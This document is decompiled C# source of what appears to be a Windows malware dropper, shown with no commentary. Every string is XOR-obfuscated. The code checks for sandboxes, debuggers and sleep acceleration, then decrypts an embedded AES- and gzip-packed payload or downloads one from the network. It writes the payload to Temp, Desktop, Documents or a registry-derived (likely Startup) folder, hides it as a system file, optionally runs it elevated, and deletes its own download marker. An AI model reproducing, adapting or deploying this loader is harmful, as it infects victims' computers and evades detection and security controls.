using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class lC4FtZRaAo
{
	private static object[] YO5MiddNzuQcV = new object[1]
	{
		new KZdharhDrRMnIRi
		{
			szdvmoPuEVNBLR = vj4LaN2A7qFwna5("Y\0\b\u001b\u0001\u000e\u0011w1-8"),
			sF58q8zyDjSNpOQ = true,
			EjmeNfi0D8gfR1BuJp = true,
			WPSqBTGi05ol = true,
			ENWeX02qxfFs2 = 2,
			KMSye9wVm22Vu = 1,
			Xr4oXXFdfwG = false,
			taHKn8JzZFhGkl6ZB = vj4LaN2A7qFwna5("Õ"),
			I4m5qBkydL1QMllF = true,
			FRBz6EEJm9V = true,
			QKJLZprZKE15Vn2m = true,
			avkwj9OVmSz = true,
			seCzTpbreX63PLg0G = new byte[432]
			{
				201, 155, 116, 128, 49, 135, 63, 84, 202, 250,
				42, 24, 217, 127, 66, 203, 9, 245, 67, 159,
				181, 218, 59, 37, 245, 92, 113, 68, 176, 18,
				85, 173, 53, 96, 217, 194, 123, 219, 73, 56,
				82, 145, 215, 131, 178, 134, 41, 163, 169, 74,
				235, 58, 254, 59, 177, 38, 35, 116, 83, 201,
				218, 53, 55, 197, 240, 105, 36, 53, 85, 75,
				123, 109, 207, 205, 199, 225, 29, 100, 165, 99,
				178, 201, 142, 184, 126, 230, 131, 71, 83, 37,
				202, 63, 112, 230, 65, 182, 95, 68, 228, 217,
				119, 103, 131, 72, 93, 26, 243, 174, 191, 230,
				161, 79, 175, 74, 188, 169, 53, 84, 127, 155,
				250, 26, 158, 168, 222, 121, 79, 145, 215, 198,
				252, 0, 62, 35, 112, 100, 70, 43, 54, 38,
				124, 207, 176, 95, 65, 110, 17, 13, 149, 48,
				6, 100, 84, 142, 245, 204, 55, 112, 86, 44,
				100, 150, 68, 77, 32, 120, 132, 233, 97, 78,
				238, 86, 54, 91, 156, 84, 138, 133, 126, 31,
				66, 11, 105, 100, 112, 242, 252, 155, 31, 213,
				253, 238, 90, 225, 105, 140, 117, 64, 183, 205,
				44, 77, 104, 106, 124, 176, 62, 32, 144, 10,
				87, 169, 159, 154, 127, 214, 5, 52, 79, 132,
				73, 43, 249, 244, 207, 93, 211, 114, 3, 84,
				196, 132, 109, 192, 189, 41, 35, 145, 63, 205,
				72, 22, 60, 187, 163, 214, 251, 91, 128, 39,
				206, 48, 242, 64, 43, 150, 71, 175, 102, 84,
				228, 170, 214, 72, 203, 123, 202, 12, 177, 117,
				96, 23, 216, 34, 212, 136, 209, 171, 133, 4,
				170, 1, 229, 187, 253, 132, 109, 212, 239, 7,
				181, 162, 20, 139, 1, 170, 186, 10, 84, 84,
				111, 32, 95, 2, 60, 32, 192, 235, 9, 19,
				66, 126, 140, 8, 46, 87, 64, 54, 141, 131,
				87, 9, 246, 85, 65, 66, 154, 236, 31, 19,
				237, 1, 255, 154, 130, 124, 131, 232, 143, 162,
				139, 67, 178, 107, 143, 245, 192, 60, 229, 190,
				218, 129, 139, 143, 250, 89, 203, 192, 92, 177,
				88, 75, 114, 126, 186, 142, 218, 31, 165, 141,
				242, 247, 193, 217, 48, 89, 243, 178, 243, 119,
				124, 70, 239, 242, 66, 179, 54, 148, 241, 5,
				29, 79, 34, 220, 128, 204, 216, 118, 164, 203,
				112, 39, 236, 42, 222, 106, 171, 212, 198, 213,
				0, 20, 44, 45, 3, 212, 87, 9, 213, 252,
				13, 229, 185, 244, 135, 247, 87, 112, 86, 198,
				31, 207
			}
		}
	};

	private static void Main()
	{
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DeleteFile(Assembly.GetExecutingAssembly().Location + vj4LaN2A7qFwna5("Lv\u0016#\")b\u0005()\"8%*%)>"));
		}
		catch
		{
		}
		bool flag = GetModuleHandle(vj4LaN2A7qFwna5("¼ïÞÕÙøÐÐ")) != IntPtr.Zero;
		bool flag2 = Process.GetProcessesByName(vj4LaN2A7qFwna5(",{E^I_DM^G")).Length > 0 || Process.GetProcesses().Any(delegate(Process process)
		{
			try
			{
				return string.Compare(process.MainWindowTitle, vj4LaN2A7qFwna5("ä°\u008c\u0081Ä³\u008d\u0096\u0081\u0097\u008c\u0085\u0096\u008fÄª\u0081\u0090\u0093\u008b\u0096\u008fÄ¥\u008a\u0085\u0088\u009d\u009e\u0081\u0096"), ignoreCase: true) == 0;
			}
			catch
			{
				return false;
			}
		});
		bool flag3 = Process.GetProcesses().Any(delegate(Process process)
		{
			try
			{
				return process.MainWindowTitle.ToLower().Contains(vj4LaN2A7qFwna5("\u0096æäùõóåå¶ûùøÿâùä¶»"));
			}
			catch
			{
				return false;
			}
		});
		int tickCount = Environment.TickCount;
		DateTime now = DateTime.Now;
		Thread.Sleep(500);
		int tickCount2 = Environment.TickCount;
		DateTime now2 = DateTime.Now;
		bool flag4 = tickCount2 - tickCount < 450 || now2 - now < TimeSpan.FromMilliseconds(450.0);
		object[] yO5MiddNzuQcV = YO5MiddNzuQcV;
		foreach (object obj2 in yO5MiddNzuQcV)
		{
			try
			{
				if (obj2 is KZdharhDrRMnIRi)
				{
					KZdharhDrRMnIRi kZdharhDrRMnIRi = (KZdharhDrRMnIRi)obj2;
					if ((!kZdharhDrRMnIRi.I4m5qBkydL1QMllF || !flag) && (!kZdharhDrRMnIRi.FRBz6EEJm9V || !flag2) && (!kZdharhDrRMnIRi.QKJLZprZKE15Vn2m || !flag3) && (!kZdharhDrRMnIRi.avkwj9OVmSz || !flag4))
					{
						byte[] array = kZdharhDrRMnIRi.seCzTpbreX63PLg0G;
						if (kZdharhDrRMnIRi.EjmeNfi0D8gfR1BuJp)
						{
							array = TIIllEVMqjsBimB(array);
						}
						if (kZdharhDrRMnIRi.sF58q8zyDjSNpOQ)
						{
							array = NrVBKhVTua9(array);
						}
						uhfUKgl167CtKgjoNeb(kZdharhDrRMnIRi.szdvmoPuEVNBLR, kZdharhDrRMnIRi.WPSqBTGi05ol, kZdharhDrRMnIRi.ENWeX02qxfFs2, kZdharhDrRMnIRi.KMSye9wVm22Vu, kZdharhDrRMnIRi.Xr4oXXFdfwG, kZdharhDrRMnIRi.taHKn8JzZFhGkl6ZB, array);
					}
				}
				else if (obj2 is CluBUAGpRm6)
				{
					CluBUAGpRm6 cluBUAGpRm = (CluBUAGpRm6)obj2;
					if ((!cluBUAGpRm.O2n6AWXqnzYp || !flag) && (!cluBUAGpRm.dMTUrFCHM1IZquzN || !flag2) && (!cluBUAGpRm.haytE7WTY7Bygl0Q || !flag3) && (!cluBUAGpRm.sBZ2N1BSjaPgkBxNKq || !flag4))
					{
						uhfUKgl167CtKgjoNeb(cluBUAGpRm.NFj7Kv6hMOFeVG4d0, cluBUAGpRm.OW21ktAKMu77TDz, cluBUAGpRm.QVN3RpSZyZc6w9VPs2, cluBUAGpRm.j43u0GaSMkP, cluBUAGpRm.cO6Rjz70GedDurEnNIs, cluBUAGpRm.Sro45AXwQGgOS59r, new WebClient().DownloadData(cluBUAGpRm.pMpvbPh0A9JbWf));
					}
				}
				else if (obj2 is TadVAbVSLK)
				{
					TadVAbVSLK tadVAbVSLK = (TadVAbVSLK)obj2;
					MessageBox.Show(tadVAbVSLK.m1zG4NU1PjCQKrZ9Uh, tadVAbVSLK.Jnkt7qrxpqI5LbHcux, tadVAbVSLK.byI857MY06G4Q57bOe, tadVAbVSLK.xpMqFLhn0OcoEM6);
				}
			}
			catch
			{
			}
		}
	}

	private static void uhfUKgl167CtKgjoNeb(string GSRdhkhgCjJX, bool lsqiHHKFPBuLwjoZK, int FIFJgfliceIQg, int UNCaYR2e8V7, bool tCUb3q2U7poO, string j6zEG78ulST, byte[] lb2FHJULZSTxakrY)
	{
		string path;
		switch (FIFJgfliceIQg)
		{
		default:
			return;
		case 1:
			path = Path.GetTempPath();
			break;
		case 2:
			path = Registry.GetValue(vj4LaN2A7qFwna5("°øûõéïóåââõþäïåãõâìãßÖÄÇÑÂÕìýÙÓÂßÃßÖÄìçÙÞÔßÇÃìóÅÂÂÕÞÄæÕÂÃÙßÞìõÈÀÜßÂÕÂìãØÕÜÜ\u0090ößÜÔÕÂÃ"), vj4LaN2A7qFwna5("\u0014o'# PQ&-$9%&'R9 !\"!9-%\" 9'-W -&!Q \"#Vi"), null) as string;
			break;
		case 3:
			path = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			break;
		case 4:
			path = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			break;
		case 5:
			path = AppDomain.CurrentDomain.BaseDirectory;
			break;
		}
		GSRdhkhgCjJX = Path.Combine(path, GSRdhkhgCjJX);
		File.Delete(GSRdhkhgCjJX);
		File.WriteAllBytes(GSRdhkhgCjJX, lb2FHJULZSTxakrY);
		if (lsqiHHKFPBuLwjoZK)
		{
			new FileInfo(GSRdhkhgCjJX).Attributes |= FileAttributes.Hidden | FileAttributes.System;
		}
		if (UNCaYR2e8V7 < 1)
		{
			return;
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo(GSRdhkhgCjJX, j6zEG78ulST);
		if (tCUb3q2U7poO)
		{
			processStartInfo.Verb = vj4LaN2A7qFwna5("\u0001sto`r");
		}
		Process process = null;
		try
		{
			process = Process.Start(processStartInfo);
		}
		catch
		{
		}
		if (UNCaYR2e8V7 >= 2)
		{
			process?.WaitForExit();
			if (UNCaYR2e8V7 >= 3)
			{
				File.Delete(GSRdhkhgCjJX);
			}
		}
	}

	private static byte[] NrVBKhVTua9(byte[] gD0Ha3BdFhsxZFyW)
	{
		MemoryStream memoryStream = new MemoryStream();
		int num = BitConverter.ToInt32(gD0Ha3BdFhsxZFyW, 0);
		memoryStream.Write(gD0Ha3BdFhsxZFyW, 4, gD0Ha3BdFhsxZFyW.Length - 4);
		byte[] array = new byte[num];
		memoryStream.Position = 0L;
		new GZipStream(memoryStream, CompressionMode.Decompress).Read(array, 0, array.Length);
		return array;
	}

	private static byte[] TIIllEVMqjsBimB(byte[] W5cBetasAQv)
	{
		byte[] array = new byte[16];
		Buffer.BlockCopy(W5cBetasAQv, 0, array, 0, 16);
		Rijndael rijndael = Rijndael.Create();
		byte[] array4 = (rijndael.IV = (rijndael.Key = array));
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(W5cBetasAQv, 16, W5cBetasAQv.Length - 16);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}

	private static string vj4LaN2A7qFwna5(string eQ8AUbp3WGCYnQxc)
	{
		return new string((from c in eQ8AUbp3WGCYnQxc.Substring(1)
			select (char)(c ^ (byte)eQ8AUbp3WGCYnQxc[0])).ToArray());
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DeleteFile(string ahJCp2nIVqD);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string UZGu8cdilgn7h);
}
